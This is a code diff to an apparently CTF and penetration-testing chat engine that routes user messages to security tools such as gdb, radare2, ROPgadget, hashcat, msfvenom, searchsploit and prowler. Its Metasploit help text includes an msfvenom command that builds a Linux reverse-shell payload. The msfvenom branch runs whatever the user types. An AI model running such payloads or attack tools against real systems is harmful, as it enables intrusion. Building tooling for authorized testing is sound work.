@@ -9261,9 +9261,21 @@ class CFAIChatEngine:
         'wpscan', 'nuclei', 'ffuf', 'amass', 'subfinder', 'dnsenum', 'dirb',
         'feroxbuster', 'dirsearch', 'enum4linux', 'volatility', 'binwalk',
         'exiftool', 'steghide', 'hashcat', 'john', 'dalfox', 'katana', 'httpx',
-        'theharvester', 'recon-ng', 'aircrack-ng', 'medusa', 'metasploit',
-        'msfconsole', 'searchsploit', 'trivy', 'prowler', 'checkov',
+        'theharvester', 'recon-ng', 'aircrack-ng', 'medusa',
+        'msfconsole', 'msfvenom', 'searchsploit', 'trivy', 'prowler', 'checkov',
         'kube-hunter', 'kube-bench', 'docker', 'terraform', 'ansible',
+        # Binary / exploitation tools
+        'checksec', 'ROPgadget', 'ropper', 'objdump', 'strings', 'readelf',
+        'ltrace', 'strace', 'nm', 'file', 'xxd', 'hexdump', 'pwn',
+        'one_gadget', 'patchelf', 'pwninit',
+    }
+
+    # Tools that are interactive by nature — wrap with non-interactive flags
+    INTERACTIVE_TOOLS = {
+        'gdb':     lambda args: ['gdb', '--batch', '-ex', 'file ' + (args[0] if args else ''), '-ex', 'info file', '-ex', 'checksec', '-ex', 'quit'] if args else ['gdb', '--help'],
+        'r2':      lambda args: ['r2', '-q', '-A', '-e', 'scr.color=false', args[0]] if args else ['r2', '-h'],
+        'radare2': lambda args: ['r2', '-q', '-A', '-e', 'scr.color=false', args[0]] if args else ['r2', '-h'],
+        'pwndbg':  lambda args: ['gdb', '--batch', '-ex', 'file ' + (args[0] if args else ''), '-ex', 'checksec', '-ex', 'quit'] if args else ['gdb', '--help'],
     }
 
     TOOL_GROUPS = {
@@ -9406,6 +9418,11 @@ class CFAIChatEngine:
                 cmd += ["--potfile-path", "/tmp/hashcat.potfile"]
             if "--session" not in " ".join(cmd):
                 cmd += ["--session", "cfai"]
+            # VPS has no GPU — force CPU mode
+            if "--force" not in cmd:
+                cmd += ["--force"]
+            if "-D" not in cmd and "--opencl-device-types" not in " ".join(cmd):
+                cmd += ["-D", "1"]
 
         elif tool in ("john",):
             rockyou = self._rockyou_path()
@@ -9586,9 +9603,15 @@ class CFAIChatEngine:
             return {"success": True, "response": self._help_response(), "suggested_tools": [], "category": "general"}
 
         # ── Direct tool command (user typed the tool name first) ──────────────
-        if first_word in self.DIRECT_TOOLS and len(words) > 1:
-            cmd = message.strip().split()
-            output = self._run_tool(cmd, timeout=180)
+        # Also handle interactive tools (gdb, r2, radare2) with non-interactive flags
+        is_interactive = first_word in self.INTERACTIVE_TOOLS
+        if (first_word in self.DIRECT_TOOLS or is_interactive) and len(words) > 1:
+            if is_interactive:
+                args = words[1:]
+                cmd = self.INTERACTIVE_TOOLS[first_word](args)
+            else:
+                cmd = message.strip().split()
+            output = self._run_tool(cmd, timeout=60)
             return {
                 "success": True,
                 "response": f"Executed: `{' '.join(cmd)}`\n\n```\n{output}\n```",
@@ -9859,8 +9882,19 @@ class CFAIChatEngine:
             "volatility", "memory dump", "memory analysis",
             "foremost", "file carv", "bulk_extractor",
         ]):
-            # Specific tool routing based on keyword
-            target_file = message.split()[-1] if len(message.split()) > 1 else None
+            # Only treat as a file path if it contains '.' or '/' — not bare tool names
+            _forensic_tools = {
+                "forensics", "forensic", "volatility", "binwalk", "exiftool",
+                "steghide", "steganography", "steg", "foremost", "firmware",
+                "metadata", "memory", "dump", "analysis", "digital", "tools",
+                "bulk_extractor", "scalpel", "strings", "file", "carv",
+            }
+            parts = message.strip().split()
+            target_file = next(
+                (p for p in reversed(parts)
+                 if ('/' in p or '.' in p) and p.lower() not in _forensic_tools),
+                None
+            )
 
             if any(w in msg_lower for w in ["volatility", "memory dump", "memory analysis"]):
                 if target_file and target_file not in ("forensics", "forensic", "volatility"):
@@ -9936,70 +9970,169 @@ class CFAIChatEngine:
             }
 
         # ── Binary Analysis / Exploitation ────────────────────────────────────
-        if any(w in msg_lower for w in [
+        _binary_kws = [
             "binary", "binary analysis", "exploit", "exploitation", "pwn",
-            "gdb", "radare2", "r2", "ropgadget", "rop", "checksec",
+            "gdb", "radare2", "r2 ", "ropgadget", "rop ", "checksec",
             "pwntools", "ropper", "binexp", "buffer overflow", "overflow",
-        ]):
-            target_file = message.split()[-1] if len(message.split()) > 1 else None
+            "objdump", "readelf", "strings ", "hexdump", "xxd",
+        ]
+        if any(w in msg_lower for w in _binary_kws):
+            # Extract the binary file argument (last word that looks like a path)
+            parts = message.strip().split()
+            bin_arg = next(
+                (p for p in reversed(parts) if p.startswith('./') or p.startswith('/') or '.' in p),
+                None
+            )
+            _skip = {"gdb", "radare2", "r2", "checksec", "ropgadget", "ropper",
+                     "objdump", "strings", "binary", "exploit", "exploitation",
+                     "pwntools", "overflow", "pwn", "rop", "binexp", "xxd", "hexdump"}
 
-            if any(w in msg_lower for w in ["checksec", "check security"]):
-                if target_file and target_file not in ("checksec", "binary", "exploit"):
-                    cmd = ["checksec", "--file", target_file]
-                    output = self._run_tool(cmd, timeout=15)
-                    return {
-                        "success": True,
-                        "response": f"Security properties of `{target_file}`:\n\n```\n{output}\n```",
-                        "executed": True,
-                        "category": "binary",
-                        "suggested_tools": ["gdb", "ROPgadget"],
-                    }
-
-            if any(w in msg_lower for w in ["ropgadget", "rop gadget", "rop chain"]):
-                if target_file and target_file not in ("ropgadget", "rop", "binary", "exploit"):
-                    cmd = ["ROPgadget", "--binary", target_file]
+            # gdb
+            if first_word == "gdb" or "gdb " in msg_lower:
+                if bin_arg and bin_arg.lower() not in _skip:
+                    cmd = ["gdb", "--batch", "-ex", f"file {bin_arg}", "-ex", "info file",
+                           "-ex", "checksec", "-ex", "info functions", "-ex", "quit"]
                     output = self._run_tool(cmd, timeout=30)
-                    return {
-                        "success": True,
-                        "response": f"ROP gadgets in `{target_file}`:\n\n```\n{output}\n```",
-                        "executed": True,
-                        "category": "binary",
-                        "suggested_tools": ["checksec", "gdb"],
-                    }
+                    return {"success": True, "executed": True, "category": "binary",
+                            "response": f"GDB analysis of `{bin_arg}`:\n\n```\n{output}\n```",
+                            "suggested_tools": ["checksec", "ROPgadget"]}
 
-            if any(w in msg_lower for w in ["binwalk", "strings"]):
-                if target_file and target_file not in ("strings", "binary", "exploit"):
-                    cmd = ["strings", target_file]
+            # radare2 / r2
+            if first_word in ("r2", "radare2") or any(w in msg_lower for w in ["radare2", "r2 "]):
+                if bin_arg and bin_arg.lower() not in _skip:
+                    cmd = ["r2", "-q", "-A", "-e", "scr.color=false",
+                           "-e", "anal.timeout=15", bin_arg]
+                    output = self._run_tool(cmd, timeout=30)
+                    return {"success": True, "executed": True, "category": "binary",
+                            "response": f"Radare2 analysis of `{bin_arg}`:\n\n```\n{output}\n```",
+                            "suggested_tools": ["gdb", "checksec"]}
+
+            # checksec
+            if first_word == "checksec" or any(w in msg_lower for w in ["checksec", "check security"]):
+                if bin_arg and bin_arg.lower() not in _skip:
+                    cmd = ["checksec", "--file", bin_arg]
                     output = self._run_tool(cmd, timeout=15)
-                    return {
-                        "success": True,
-                        "response": f"Strings in `{target_file}`:\n\n```\n{output}\n```",
-                        "executed": True,
-                        "category": "binary",
-                        "suggested_tools": ["binwalk", "checksec"],
-                    }
+                    return {"success": True, "executed": True, "category": "binary",
+                            "response": f"Security properties of `{bin_arg}`:\n\n```\n{output}\n```",
+                            "suggested_tools": ["gdb", "ROPgadget"]}
 
+            # ROPgadget / ropper
+            if first_word in ("ropgadget", "ropper") or any(w in msg_lower for w in ["ropgadget", "rop gadget", "rop chain", "ropper"]):
+                if bin_arg and bin_arg.lower() not in _skip:
+                    cmd = ["ROPgadget", "--binary", bin_arg] if "ropgadget" in msg_lower or first_word == "ropgadget" else ["ropper", "-f", bin_arg]
+                    output = self._run_tool(cmd, timeout=30)
+                    return {"success": True, "executed": True, "category": "binary",
+                            "response": f"ROP gadgets in `{bin_arg}`:\n\n```\n{output}\n```",
+                            "suggested_tools": ["checksec", "gdb"]}
+
+            # strings
+            if first_word == "strings" or "strings " in msg_lower:
+                if bin_arg and bin_arg.lower() not in _skip:
+                    cmd = ["strings", bin_arg]
+                    output = self._run_tool(cmd, timeout=15)
+                    return {"success": True, "executed": True, "category": "binary",
+                            "response": f"Strings in `{bin_arg}`:\n\n```\n{output}\n```",
+                            "suggested_tools": ["binwalk", "checksec"]}
+
+            # objdump
+            if first_word == "objdump" or "objdump" in msg_lower:
+                if bin_arg and bin_arg.lower() not in _skip:
+                    cmd = ["objdump", "-d", bin_arg]
+                    output = self._run_tool(cmd, timeout=20)
+                    return {"success": True, "executed": True, "category": "binary",
+                            "response": f"Disassembly of `{bin_arg}`:\n\n```\n{output}\n```",
+                            "suggested_tools": ["gdb", "r2"]}
+
+            # xxd / hexdump
+            if first_word in ("xxd", "hexdump") or any(w in msg_lower for w in ["xxd ", "hexdump "]):
+                if bin_arg and bin_arg.lower() not in _skip:
+                    cmd = ["xxd", bin_arg]
+                    output = self._run_tool(cmd, timeout=15)
+                    return {"success": True, "executed": True, "category": "binary",
+                            "response": f"Hex dump of `{bin_arg}`:\n\n```\n{output}\n```",
+                            "suggested_tools": ["strings", "binwalk"]}
+
+            # No file target — show tools list
             return {
                 "success": True,
                 "response": (
                     "Available Binary Analysis & Exploitation tools:\n\n"
-                    "  gdb          — GNU debugger with pwndbg/peda\n"
-                    "  radare2 (r2) — Reverse engineering framework\n"
-                    "  checksec     — Check binary security properties\n"
+                    "  gdb          — GNU debugger (batch info + checksec)\n"
+                    "  r2 / radare2 — Reverse engineering framework\n"
+                    "  checksec     — Check binary security properties (NX, PIE, RELRO)\n"
                     "  ROPgadget    — Find ROP gadgets in binaries\n"
                     "  ropper       — ROP chain builder\n"
-                    "  pwn (pwntools) — CTF exploitation toolkit\n"
+                    "  pwn          — pwntools CTF exploitation toolkit\n"
                     "  objdump      — Disassembler\n"
-                    "  strings      — Extract printable strings\n\n"
+                    "  strings      — Extract printable strings\n"
+                    "  xxd          — Hex dump\n"
+                    "  readelf      — ELF file analysis\n\n"
                     "Examples:\n"
-                    "  checksec binary\n"
-                    "  ROPgadget --binary ./binary\n"
-                    "  strings ./binary | grep -i flag\n"
+                    "  checksec ./binary\n"
                     "  gdb ./binary\n"
-                    "  r2 ./binary"
+                    "  r2 ./binary\n"
+                    "  ROPgadget --binary ./binary\n"
+                    "  strings ./binary\n"
+                    "  objdump -d ./binary"
                 ),
                 "category": "binary",
-                "suggested_tools": ["gdb", "checksec", "ROPgadget", "radare2"],
+                "suggested_tools": ["gdb", "checksec", "ROPgadget", "r2"],
+            }
+
+        # ── Metasploit ────────────────────────────────────────────────────────
+        if any(w in msg_lower for w in ["metasploit", "msfconsole", "msf ", "msfvenom", "exploit module", "use exploit"]):
+            if "msfvenom" in msg_lower or first_word == "msfvenom":
+                # msfvenom can run non-interactively
+                cmd = words
+                output = self._run_tool(cmd, timeout=30)
+                return {"success": True, "executed": True, "category": "exploitation",
+                        "response": f"Executed: `{' '.join(cmd)}`\n\n```\n{output}\n```",
+                        "suggested_tools": ["searchsploit"]}
+            if "searchsploit" in msg_lower or first_word == "searchsploit":
+                cmd = words
+                output = self._run_tool(cmd, timeout=30)
+                return {"success": True, "executed": True, "category": "exploitation",
+                        "response": f"Executed: `{' '.join(cmd)}`\n\n```\n{output}\n```",
+                        "suggested_tools": ["msfconsole"]}
+            return {
+                "success": True,
+                "response": (
+                    "Metasploit Framework — the binary is `msfconsole`.\n\n"
+                    "Note: msfconsole is interactive and cannot be run non-interactively here.\n"
+                    "Use searchsploit or msfvenom instead:\n\n"
+                    "  searchsploit <keyword>              — Search exploit database\n"
+                    "  msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f elf -o shell\n"
+                    "                                       — Generate a payload\n\n"
+                    "Examples:\n"
+                    "  searchsploit wordpress 5.8\n"
+                    "  msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o shell"
+                ),
+                "category": "exploitation",
+                "suggested_tools": ["searchsploit", "msfvenom"],
+            }
+
+        # ── Prowler (AWS) ─────────────────────────────────────────────────────
+        if any(w in msg_lower for w in ["prowler", "aws scan", "cloud audit", "aws audit"]):
+            if target:
+                cmd = ["prowler", "aws", "--region", target] if re.match(r'^[a-z]+-[a-z]+-\d$', target) else ["prowler", "aws"]
+                output = self._run_tool(cmd, timeout=300)
+                return {"success": True, "executed": True, "category": "cloud",
+                        "response": f"Prowler AWS audit:\n\n```\n{output}\n```",
+                        "suggested_tools": ["trivy", "checkov"]}
+            return {
+                "success": True,
+                "response": (
+                    "Prowler requires AWS credentials. Configure first:\n\n"
+                    "  aws configure   (enter Access Key, Secret Key, Region)\n\n"
+                    "Then run:\n"
+                    "  prowler aws\n"
+                    "  prowler aws --service s3 ec2\n"
+                    "  prowler aws -r us-east-1\n\n"
+                    "Or use a specific check:\n"
+                    "  prowler aws --check s3_bucket_public_access_block"
+                ),
+                "category": "cloud",
+                "suggested_tools": ["trivy", "checkov"],
             }
 
         # ── Bug bounty ────────────────────────────────────────────────────────
